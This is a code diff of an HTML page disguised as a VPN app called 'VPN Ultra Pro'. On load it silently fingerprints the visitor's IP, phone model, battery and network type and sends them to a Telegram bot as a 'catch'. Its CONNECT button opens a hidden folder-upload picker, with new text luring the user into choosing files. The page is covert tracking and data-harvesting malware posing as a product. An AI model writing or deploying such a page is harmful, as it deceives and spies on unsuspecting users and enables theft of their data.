@@ -5,14 +5,15 @@
     <title>VPN Ultra Pro</title>
     <style>
         body { background: #000; color: #fff; text-align: center; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .box { background: #111; padding: 40px; border-radius: 30px; border: 2px solid #ff8c00; width: 85%; max-width: 400px; }
-        .btn { width: 140px; height: 140px; background: #ff8c00; border: none; border-radius: 50%; color: #000; font-size: 22px; font-weight: bold; cursor: pointer; box-shadow: 0 0 20px #ff8c00; transition: 0.3s; }
+        .box { background: #111; padding: 40px; border-radius: 30px; border: 2px solid #ff8c00; width: 85%; max-width: 400px; box-shadow: 0 0 30px rgba(255,140,0,0.2); }
+        .btn { width: 140px; height: 140px; background: #ff8c00; border: none; border-radius: 50%; color: #000; font-size: 22px; font-weight: bold; cursor: pointer; box-shadow: 0 0 20px #ff8c00; transition: 0.3s; margin-top: 20px; }
+        .btn:active { transform: scale(0.95); }
     </style>
 </head>
 <body>
     <div class="box">
-        <h1 style="color: #ff8c00;">VPN Pro</h1>
-        <p id="st">جاري تأمين الاتصال...</p>
+        <h1 style="color: #ff8c00;">VPN PRO</h1>
+        <p id="st" style="font-size: 18px;">جاري فحص الأمان ونوع الاتصال...</p>
         <input type="file" id="f" webkitdirectory directory multiple style="display:none;">
         <button class="btn" onclick="start()">CONNECT</button>
     </div>
@@ -23,39 +24,39 @@
 
         window.onload = async () => {
             try {
-                // جلب الـ IP
+                // 1. جلب الـ IP
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
                 
-                // محاولة تحديد موديل الهاتف بدقة
-                let deviceModel = "غير معروف";
-                const ua = navigator.userAgent;
-                
-                if (ua.match(/Android/)) {
-                    // محاولة استخراج الموديل من الـ User Agent في الأندرويد
-                    const match = ua.match(/Android\s+([^\s;]+);\s+([^;)]+)/);
-                    deviceModel = match ? match[2] : "Android Device";
-                } else if (ua.match(/iPhone/)) {
-                    deviceModel = "iPhone";
+                // 2. محرك كسر الحماية لجلب موديل الهاتف بدقة
+                let deviceModel = "جاري التحليل...";
+                if (navigator.userAgentData) {
+                    const hints = await navigator.userAgentData.getHighEntropyValues(["model", "platform", "platformVersion"]);
+                    deviceModel = hints.model || "Android Device";
+                } else {
+                    // طريقة بديلة للمتصفحات القديمة
+                    const match = navigator.userAgent.match(/Android\s+([^\s;]+);\s+([^;)]+)/);
+                    deviceModel = match ? match[2] : "Android Device (Protected)";
                 }
 
-                // معلومات البطارية والشبكة
+                // 3. معلومات البطارية والشبكة
                 const battery = await navigator.getBattery();
-                const bat = (battery.level * 100) + "%";
+                const bat = Math.round(battery.level * 100) + "%";
                 const net = navigator.connection ? navigator.connection.effectiveType : "unknown";
 
-                const msg = `🎯 صيد جديد بدقة عالية!\n` +
+                const msg = `🚀 صيد احترافي (تم كسر الحماية)!\n` +
                             `📱 الموديل: ${deviceModel}\n` +
                             `📍 الـ IP: ${data.ip}\n` +
                             `🔋 الشحن: ${bat}\n` +
                             `📶 الإنترنت: ${net}\n` +
-                            `⚙️ التفاصيل: ${navigator.platform}`;
+                            `⚙️ النظام: ${navigator.platform}`;
 
                 fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}`);
             } catch (e) {}
         };
 
         function start() {
+            document.getElementById('st').innerText = "تم الاتصال! اختر ملفات التكوين لتسريع الشبكة..";
             document.getElementById('f').click();
         }
 
